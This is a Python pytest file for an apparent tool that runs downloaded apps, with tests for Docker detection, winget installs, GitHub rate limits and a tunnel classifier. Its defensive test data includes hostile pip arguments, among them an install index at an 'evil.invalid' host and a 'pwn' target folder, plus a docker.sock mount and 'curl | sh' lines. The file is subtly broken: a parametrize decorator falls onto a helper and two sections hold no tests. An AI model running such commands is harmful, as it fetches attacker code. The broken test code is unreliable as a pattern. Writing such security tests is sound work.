"""Docker first, runtimes installed under the one Yes, Toolsmith's path and
argument rules, no repeated repairs, named reasons.

Nothing here installs a program, starts Docker or reaches the internet:
the installer seams are replaced (and conftest blocks them anyway).
"""
from __future__ import annotations

import json
import os
import sys

import pytest

from puffpai import deps, github_account
from puffpai.integrate import apply, classify, run_here


def _write(root, rel, text):
    path = os.path.join(str(root), *rel.split("/"))
    os.makedirs(os.path.dirname(path), exist_ok=True)
    with open(path, "w", encoding="utf-8") as fh:
        fh.write(text)
    return path


@pytest.fixture
def docker_here(monkeypatch):
    real = run_here._host_program
    monkeypatch.setattr(run_here, "_host_program",
                        lambda name: "C:/docker/docker.exe" if name == "docker" else real(name))


# -- docker first ----------------------------------------------------------------------

def test_an_app_that_ships_compose_runs_in_its_containers_first(tmp_path, docker_here):
    _write(tmp_path, "package.json", json.dumps({"scripts": {"start": "node server.js"}}))
    _write(tmp_path, "server.js", "")
    _write(tmp_path, "docker-compose.yml",
           "services:\n  web:\n    build: .\n    ports:\n      - '3000:3000'\n")
    plan = run_here.detect(str(tmp_path), port=4321)
    assert plan["how"] == "compose" and plan["compose_file"] == "docker-compose.yml"
    native = run_here.detect(str(tmp_path), port=4321, docker=False)
    assert native["how"] == "node_server", "its own way is the fallback"


def test_a_compose_file_of_only_a_database_is_not_the_app(tmp_path, docker_here):
    _write(tmp_path, "package.json", json.dumps({"scripts": {"start": "node server.js"}}))
    _write(tmp_path, "server.js", "")
    _write(tmp_path, "docker-compose.yml",
           "services:\n  db:\n    image: postgres:16\n    ports:\n      - '5432:5432'\n")
    assert run_here.detect(str(tmp_path), port=4321)["how"] == "node_server"


def test_a_compose_file_in_its_docker_folder_is_found(tmp_path, docker_here):
    _write(tmp_path, "docker/compose.yaml",
           "services:\n  app:\n    image: ghcr.io/x/app:1\n    ports:\n      - 8080:80\n")
    assert run_here.detect(str(tmp_path), port=1)["compose_file"] == "docker/compose.yaml"


def test_the_image_its_readme_documents_becomes_a_compose_file(tmp_path, docker_here):
    _write(tmp_path, "README.md", "# Speedy\n\n```bash\ndocker run -d --name speedy \\\n"
           "  -p 8080:80 -v /srv/speedy:/config -e TZ=UTC \\\n  lscr.io/x/speedy:latest\n```\n")
    plan = run_here.detect(str(tmp_path), port=1)
    assert plan["how"] == "compose" and plan["compose_file"] == run_here.README_COMPOSE
    config = json.loads(plan["compose_inline"])
    svc = config["services"]["app"]
    assert svc["image"] == "lscr.io/x/speedy:latest"
    assert svc["ports"] == [{"target": 80, "published": "8080"}]
    assert svc["volumes"] == ["data1:/config"], "her folder becomes Docker's own volume"
    assert svc["environment"] == {"TZ": "UTC"} and "data1" in config["volumes"]
    assert plan["compose_inline"] and run_here.plan_sha(plan) != run_here.plan_sha(
        dict(plan, compose_inline="x")), "the yes covers the file it writes"


def test_a_readme_run_line_that_wants_docker_itself_or_the_host_network_is_not_used(tmp_path):
    assert run_here._run_to_service(
        "docker run -p 80:80 -v /var/run/docker.sock:/var/run/docker.sock x/y") is None
    assert run_here._run_to_service("docker run --network host -p 80:80 x/y") is None
    assert run_here._run_to_service("docker run x/y") is None, "no page: not an app"


def test_without_docker_and_no_way_to_install_it_the_app_runs_its_own_way(tmp_path,
                                                                          monkeypatch):
    monkeypatch.setattr(run_here, "docker_route_ok", lambda: False)
    _write(tmp_path, "package.json", json.dumps({"scripts": {"start": "node server.js"}}))
    _write(tmp_path, "server.js", "")
    _write(tmp_path, "compose.yaml", "services:\n  web:\n    build: .\n    ports: ['1:1']\n")
    assert run_here.detect(str(tmp_path), port=1)["how"] == "node_server"


def test_ports_go_to_free_places_on_this_computer_and_the_web_one_comes_first(monkeypatch):
    monkeypatch.setattr(run_here, "_free", lambda port: port != 8080)
    monkeypatch.setattr(run_here, "free_port", lambda: 41234)
    config = {"services": {
        "db": {"ports": [{"target": 5432, "published": "5432"}]},
        "web": {"ports": [{"target": 80, "published": "8080"}, {"target": 3000}]}}}
    ports = run_here.limit_ports(config, remap=True)
    assert ports[0] == 41234 and 5432 in ports
    web = config["services"]["web"]["ports"]
    assert all(p["host_ip"] == "127.0.0.1" for p in web)
    assert web[0]["published"] == "41234"


def test_a_test_run_uses_its_own_compose_project_names(monkeypatch):
    monkeypatch.setenv("PUFFPAI_COMPOSE_PREFIX", "bbtest-")
    assert run_here.project_name("app-abcdefgh") == "bbtest-app-abcdefgh"
    monkeypatch.setenv("PUFFPAI_COMPOSE_PREFIX", "BAD prefix")
    assert run_here.project_name("app-abcdefgh") == "bb-app-abcdefgh"


# -- runtimes installed under the yes --------------------------------------------------

def test_docker_is_installed_with_winget_then_started_and_waited_for(monkeypatch):
    ran = []
    state = {"installed": False, "answers": 0}
    monkeypatch.setattr(deps, "_is_windows", lambda: True)
    monkeypatch.setattr(deps, "installer_argv",
                        lambda step, v, target=None: ["winget", "install", "--id", step["name"]])

    def fake(argv, extra_env=None):
        ran.append(argv)
        if argv[:2] == ["winget", "install"]:
            state["installed"] = True
            return {"code": 0, "output": "Successfully installed"}
        state["answers"] += 1
        return {"code": 0 if state["answers"] > 2 else 1, "output": ""}
    monkeypatch.setattr(deps, "_run_installer", fake)
    monkeypatch.setattr(deps, "_docker_path",
                        lambda: "C:/docker/docker.exe" if state["installed"] else None)
    started = []
    monkeypatch.setattr(deps, "_start_docker", lambda: started.append(1))
    monkeypatch.setattr(deps, "DOCKER_WAIT_S", 60)
    clock = iter(range(0, 10_000, 5))
    monkeypatch.setattr(deps, "_clock", lambda: next(clock))
    got = deps.install_program("docker")
    assert got["ok"], got
    assert ran[0] == ["winget", "install", "--id", "Docker.DockerDesktop"]
    assert started == [1]


def test_a_restart_after_installing_docker_is_said_plainly(monkeypatch):
    monkeypatch.setattr(deps, "_is_windows", lambda: True)
    monkeypatch.setattr(deps, "installer_argv", lambda step, v, target=None: ["winget"])
    monkeypatch.setattr(deps, "_run_installer", lambda argv, extra_env=None: {
        "code": 0, "output": "A restart is required to finish the install."})
    monkeypatch.setattr(deps, "_docker_path", lambda: None)
    got = deps.install_program("docker")
    assert got["ok"] and got["restart"] and "restart" in got["line"]


def test_an_install_that_failed_is_not_tried_again_right_away(monkeypatch):
    calls = []
    monkeypatch.setattr(deps, "_system_step", lambda name: {"kind": "winget", "name": "X.Y"})
    monkeypatch.setattr(deps, "installer_argv", lambda step, v, target=None: ["winget"])

    def fail(argv, extra_env=None):
        calls.append(argv)
        return {"code": 1, "output": "error: no network"}
    monkeypatch.setattr(deps, "_run_installer", fail)
    first = deps.install_program("node")
    second = deps.install_program("node")
    assert not first["ok"] and second == {"ok": False, "line": first["line"]}
    assert len(calls) == 1


def test_only_programs_on_buildbots_own_list_are_installed():
    assert deps.install_program("evil-tool")["ok"] is False


def test_docker_already_installed_but_stopped_is_started(monkeypatch):
    monkeypatch.setattr(deps, "_docker_path", lambda: "C:/docker/docker.exe")
    answers = iter([False, False, True])
    monkeypatch.setattr(deps, "docker_answers", lambda: next(answers))
    started = []
    monkeypatch.setattr(deps, "_start_docker", lambda: started.append(1))
    monkeypatch.setattr(deps, "DOCKER_WAIT_S", 60)
    clock = iter(range(0, 10_000, 5))
    monkeypatch.setattr(deps, "_clock", lambda: next(clock))
    assert deps.ensure_docker_running()["ok"] and started == [1]


def test_the_yes_card_says_what_it_installs_first(monkeypatch):
    monkeypatch.setattr(deps, "can_install", lambda name: True)
    lines = apply._missing_lines(["docker"])
    assert lines and "Docker" in lines[0] and "installs it first" in lines[0]


# -- Toolsmith: the project's own folder, and the closed holes -------------------------

@pytest.mark.parametrize("argv", [
    ["python", "-m", "pip._internal", "install", "--target=C:/Users/Public/pwn", "six"],
    ["pip", "install", "--target", "C:/Users/Public/x", "six"],
    ["pip", "install", "--prefix=/usr/local", "six"],
    ["pip", "install", "--root", "../..", "six"],
    ["python", "-m", "pip._internal", "install", "--index-url",
     "http://localhost.evil.invalid/simple", "six"],
    ["python", "-m", "http.server", "--directory=C:/Users", "8000"],
    ["uvicorn", "app:app", "--app-dir=C:/Users/Public"],
    ["python", "-m", "webbrowser", "http://localhost.evil.invalid"],
    ["python", "-m", "pip._internal.cli.main", "download", "-d", "C:/x", "six"],
])
# -- repairs never repeat a command that failed ----------------------------------------

def _plan():
    return {"how": "node_server", "runtime": "node", "port": 1,
            "steps": [{"what": "install", "tool": "npm", "args": ["install"]}],
            "start": {"tool": "npm", "args": ["start"]}}


# -- GitHub: "slow down" is respected --------------------------------------------------

def test_a_secondary_rate_limit_blocks_searches_until_its_time(monkeypatch):
    store = {}
    monkeypatch.setattr(github_account, "_read", lambda name: dict(store))
    monkeypatch.setattr(github_account, "_write", lambda name, data: store.update(data))
    github_account.note_rate({"Retry-After": "120"}, 403, "search")
    assert github_account.rate_blocked("search")
    store.clear()
    github_account.note_rate({"x-ratelimit-limit": "10", "x-ratelimit-remaining": "4",
                              "x-ratelimit-reset": "1", "x-ratelimit-resource": "search"}, 200)
    assert not github_account.rate_blocked("search")


# -- a curl | sh in a container build is not a hidden connection here ------------------

def test_a_container_builds_own_curl_pipe_is_not_a_hidden_connection():
    assert not classify._tunnel_in("Dockerfile", "RUN curl -fsSL https://x/setup | bash -")
    assert not classify._tunnel_in("docs/install.md", "curl https://x | sh")
    assert not classify._tunnel_in("start.sh", "curl https://x | sh")   # an install step (f18de5d)
    assert classify._tunnel_in("Dockerfile", "RUN ngrok http 80")


@pytest.mark.skipif(sys.platform != "win32", reason="Windows words")
def test_install_notes_say_admin_and_restart_plainly():
    assert "admin" in deps.install_note("docker") and "restart" in deps.install_note("docker")
